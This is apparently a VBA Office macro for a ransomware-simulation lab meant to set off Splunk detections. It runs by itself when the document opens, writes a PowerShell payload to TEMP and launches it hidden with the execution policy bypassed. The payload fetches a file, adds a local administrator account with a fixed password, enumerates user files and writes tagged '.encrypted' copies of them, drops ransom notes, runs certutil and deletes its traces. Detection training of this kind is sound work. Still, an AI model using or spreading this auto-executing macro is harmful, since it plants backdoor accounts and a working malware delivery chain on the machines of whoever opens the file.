Sub AutoOpen()
    ExecuteRansomwareAttack
End Sub

Sub Document_Open()
    ExecuteRansomwareAttack
End Sub

Sub ExecuteRansomwareAttack()

    Dim shell As Object
    Dim payloadPath As String
    Dim fso As Object
    Dim file As Object

    payloadPath = Environ("TEMP") & "\stage2.ps1"

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set file = fso.CreateTextFile(payloadPath, True)

    file.WriteLine "# Stage 2: Ransomware Simulation Payload"
    file.WriteLine "Write-Host '[Stage 2] Payload executing...' -ForegroundColor Yellow"
    file.WriteLine ""
    file.WriteLine "# Simulate download cradle (triggers Detection 03)"
    file.WriteLine "Invoke-WebRequest -Uri 'https://www.google.com' -OutFile ($env:TEMP + '\payload.dat') -ErrorAction SilentlyContinue"
    file.WriteLine "Write-Host ' [+] Payload downloaded' -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 3: Persistence (triggers Detection 06)"
    file.WriteLine "Write-Host '[Stage 3] Creating persistence...' -ForegroundColor Yellow"
    file.WriteLine "net user RansomAdmin P@ssw0rd123! /add 2>$null"
    file.WriteLine "net localgroup Administrators RansomAdmin /add 2>$null"
    file.WriteLine "Write-Host ' [+] Admin account created' -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 4: Discovery"
    file.WriteLine "Write-Host '[Stage 4] Enumerating files...' -ForegroundColor Yellow"
    file.WriteLine "$targetFiles = Get-ChildItem -Path 'C:\UserData' -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Extension -in @('.txt','.xlsx','.docx') }"
    file.WriteLine "Write-Host (' [+] Found ' + $targetFiles.Count + ' files') -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 5: Encryption (triggers Detections 07 & 09)"
    file.WriteLine "Write-Host '[Stage 5] Encrypting files...' -ForegroundColor Yellow"
    file.WriteLine "$encrypted = 0"
    file.WriteLine "foreach ($f in $targetFiles) {"
    file.WriteLine "    try {"
    file.WriteLine "        $encPath = $f.FullName + '.encrypted'"
    file.WriteLine "        $content = Get-Content $f.FullName -Raw -ErrorAction SilentlyContinue"
    file.WriteLine "        ('ENCRYPTED_BY_RANSOMWARE_LAB3|' + $content) | Out-File $encPath -Force"
    file.WriteLine "        $encrypted++"
    file.WriteLine "        if ($encrypted % 10 -eq 0) { Write-Host ('   Encrypted ' + $encrypted + ' files...') -ForegroundColor DarkYellow }"
    file.WriteLine "    } catch { }"
    file.WriteLine "}"
    file.WriteLine "Write-Host (' [+] Total encrypted: ' + $encrypted + ' files') -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 6: Ransom note (triggers Detection 08)"
    file.WriteLine "Write-Host '[Stage 6] Dropping ransom note...' -ForegroundColor Yellow"
    file.WriteLine "$note = '========================================' + [Environment]::NewLine"
    file.WriteLine "$note += '     YOUR FILES HAVE BEEN ENCRYPTED' + [Environment]::NewLine"
    file.WriteLine "$note += '========================================' + [Environment]::NewLine"
    file.WriteLine "$note += 'Send 5 BTC to recover your files.' + [Environment]::NewLine"
    file.WriteLine "$note += 'Contact: decrypt@ransomware.onion' + [Environment]::NewLine"
    file.WriteLine "$note += '*** THIS IS A SIMULATION - Lab 3 ***' + [Environment]::NewLine"
    file.WriteLine "$note | Out-File ($env:USERPROFILE + '\Desktop\README_RANSOM.txt') -Force"
    file.WriteLine "$note | Out-File 'C:\UserData\README_RANSOM.txt' -Force"
    file.WriteLine "Write-Host ' [+] Ransom notes dropped' -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 7: LOLBin certutil (triggers Detection 04)"
    file.WriteLine "Write-Host '[Stage 7] Executing certutil...' -ForegroundColor Yellow"
    file.WriteLine "certutil -encode ($env:USERPROFILE + '\Desktop\README_RANSOM.txt') ($env:TEMP + '\encoded_note.txt')"
    file.WriteLine "Write-Host ' [+] certutil executed' -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "# Stage 8: Cleanup"
    file.WriteLine "Write-Host '[Stage 8] Cleaning up traces...' -ForegroundColor Yellow"
    file.WriteLine "Start-Sleep -Seconds 3"
    file.WriteLine "Remove-Item ($env:TEMP + '\stage2.ps1') -Force -ErrorAction SilentlyContinue"
    file.WriteLine "Remove-Item ($env:TEMP + '\payload.dat') -Force -ErrorAction SilentlyContinue"
    file.WriteLine "Write-Host ' [+] Cleanup complete' -ForegroundColor Green"
    file.WriteLine ""
    file.WriteLine "Write-Host '========================================' -ForegroundColor Cyan"
    file.WriteLine "Write-Host '  ATTACK SIMULATION COMPLETE' -ForegroundColor Cyan"
    file.WriteLine "Write-Host '========================================' -ForegroundColor Cyan"

    file.Close

    Set shell = CreateObject("WScript.Shell")

    MsgBox "Macro executed! PowerShell payload launching silently..." & vbCrLf & vbCrLf & "Check Splunk in 5 minutes.", vbInformation, "Lab 3: Ransomware Simulation"

    shell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """ & payloadPath & """", 0, False

    MsgBox "Attack simulation running in background." & vbCrLf & "Go to Splunk now and watch for alerts!", vbInformation, "Lab 3"

    Set shell = Nothing
    Set fso = Nothing

End Sub
